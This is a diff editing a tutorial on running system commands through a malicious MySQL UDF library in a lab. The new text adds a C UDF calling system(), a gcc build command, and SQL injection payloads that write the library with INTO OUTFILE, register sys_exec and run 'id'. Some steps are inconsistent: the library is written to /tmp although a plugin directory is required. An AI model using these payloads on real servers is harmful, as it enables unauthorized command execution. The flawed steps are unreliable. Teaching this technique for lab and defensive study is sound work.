@@ -1,6 +1,6 @@
 ---
 title: Execute Commands via MySQL UDF Library
-description: Learn to exploit MySQL User Defined Functions for command execution.
+description: Learn to exploit MySQL User Defined Functions for command execution in a vulnerable environment.
 keywords:
 - MySQL
 - UDF Library
@@ -9,39 +9,50 @@ keywords:
 - security vulnerability
 - sys_exec
 - malicious UDF
+- SQL injection
+- FILE privilege
+- secure_file_priv
 ---
 
 # COMMAND - UDF Library
 
 ## Context
 
-This article explores the technique of executing commands on a MySQL server through the use of User Defined Functions (UDF) libraries. The objective is to understand how attackers can exploit this method to execute arbitrary commands if the server is not properly secured. This topic assumes knowledge of user-defined functions and general command execution techniques.
+This article explores executing commands on a MySQL server using User Defined Functions (UDF) libraries in a controlled lab environment. The objective is to understand how attackers can exploit misconfigured servers to execute arbitrary commands. Assumes knowledge of SQL injection, UDFs, and command execution techniques.
 
 ## Theory
 
 ### User Defined Functions (UDF) in MySQL
 
-User Defined Functions (UDFs) are custom functions that developers can add to MySQL servers to extend their features beyond what is available natively. These functions are implemented in a shared library and then linked to the MySQL server. Typically, UDFs are used to perform complex calculations or extend functionality. However, if the MySQL server is not properly configured, UDFs can be leveraged to execute arbitrary system-level commands.
+User Defined Functions (UDFs) are custom functions added to MySQL to extend functionality, implemented as shared libraries linked to the server. Typically used for complex calculations, UDFs can execute system commands if the server lacks proper security (e.g., excessive permissions or file access).
 
-#### Vulnerability Model
+### Vulnerability Model
 
-The security risk lies in the ability to upload and execute custom UDFs. If the attacker gains access to upload files and creates a UDF that includes malicious code, they can execute commands on the server. This vulnerability arises particularly in environments where user access control and file permissions are not stringently managed.
+The risk arises when attackers exploit weak access controls to upload malicious UDF libraries and execute them. This requires specific MySQL privileges (e.g., FILE and CREATE FUNCTION) and write access to server directories, often enabled in poorly secured setups or via chained vulnerabilities like Local File Inclusion (LFI).
+
+### Prerequisites for UDF Exploitation
+
+For successful UDF exploitation, several conditions must be met:
+- **FILE privilege**: Required to read/write files on the server
+- **CREATE FUNCTION privilege**: Needed to register new UDFs
+- **Writable directory**: MySQL must have write access to a directory where it can load shared objects
+- **secure_file_priv configuration**: Must allow file operations to the target directory
+- **SQL injection vulnerability**: To deliver the payload and execute commands
 
 ### Command Execution via UDF
 
-To execute a command using a UDF, an attacker typically follows a sequence of steps:
-
-1. **Upload a Malicious UDF Library:** The attacker compiles a shared object library containing the malicious UDF and uploads it to a location accessible by the MySQL server.
-
-2. **Invoke the UDF:** Once the library is in place, the attacker can create a MySQL function linked to this library and invoke it to execute system commands.
+To execute commands, an attacker:
+1. Creates a malicious UDF library (e.g., with system() calls)
+2. Uploads it to a server directory MySQL can access via SQL injection
+3. Registers the UDF and invokes it to run commands
 
 ## Practice
 
 ### Command Execution via UDF Library
 
-This section explains how to execute commands on a MySQL server using a UDF library. It details the necessary steps to achieve command execution if the server's security controls are inadequate.
+This lab demonstrates command execution via UDF in a vulnerable MySQL setup (e.g., Dockerized app with FILE privilege and writable plugin directory). Note: For ethical lab use only; unauthorized access is illegal.
 
-- First, write a C program that implements the desired system execution function. Here is a simple example of the C code (`udf.c`):
+- **Step 1: Write a C program for the malicious UDF (udf.c):**
 
   ```c
   #include <stdlib.h>
@@ -51,31 +62,44 @@ This section explains how to execute commands on a MySQL server using a UDF libr
   }
   ```
 
-- Compile this code into a shared object file that can be loaded by the MySQL server:
+- **Step 2: Compile it into a shared object file:**
 
   ```bash
   gcc -shared -o libudf.so -fPIC udf.c
   ```
 
-- Copy or upload the compiled `libudf.so` file to a directory where MySQL can load it. Commonly, this would be a directory MySQL has write permissions to such as `/usr/lib/mysql/plugin`.
+- **Step 3: Check MySQL configuration and privileges:**
 
-- Create a new UDF via the SQLi using the uploaded shared object:
-
-  ```bash
-  CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'libudf.so';
+  ```sql
+  SELECT @@secure_file_priv;
+  SHOW GRANTS FOR CURRENT_USER();
   ```
 
-- You can now execute system commands via the sqli using the new UDF. For instance, to check the current user ID, you can execute:
+- **Step 4: Exploit a vulnerability (e.g., SQL injection with FILE privilege) to write the compiled libudf.so to a MySQL-accessible directory. Example payload for a vulnerable endpoint (`/search.php?q=[INJECT]`) with FILE privilege:**
 
-  ```bash
-  SELECT sys_exec('id');
+  ```sql
+  1' UNION SELECT 0x[hex-encoded-libudf.so] INTO OUTFILE '/tmp/libudf.so' --
+  ```
+
+- **Step 5: Create the UDF function, assuming CREATE FUNCTION privilege (often requires compromised admin credentials):**
+
+  ```sql
+  1' UNION SELECT 1; CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'libudf.so' --
+  ```
+
+- **Step 6: Execute a system command via the UDF, using SQL injection:**
+
+  ```sql
+  1' UNION SELECT sys_exec('id') --
   ```
 
 #### Result
 
-Executing the steps above will allow you to execute any system-level command on the MySQL server where the UDF was created. Through the UDF, attackers gain the ability to manipulate or extract data, create persistent backdoors, or further exploit the network.
+If successful, the UDF executes system commands (e.g., `id` returns user details) on the server. This highlights risks of excessive MySQL privileges and poor file access controls, enabling data manipulation or backdoors.
 
 ## Tools
 
-- **gcc**: A compiler to create shared object files from C source code.
-- **mysql client**: Command-line tool to connect to the MySQL server and execute SQL queries.
+- **gcc**: Compiler for creating shared object files from C code
+- **sqlmap**: Automates SQL injection to exploit FILE privileges and deliver payloads
+- **Burp Suite**: Manual testing for crafting and injecting payloads
+- **hexdump**: Convert binary files to hexadecimal for SQL injection payloads
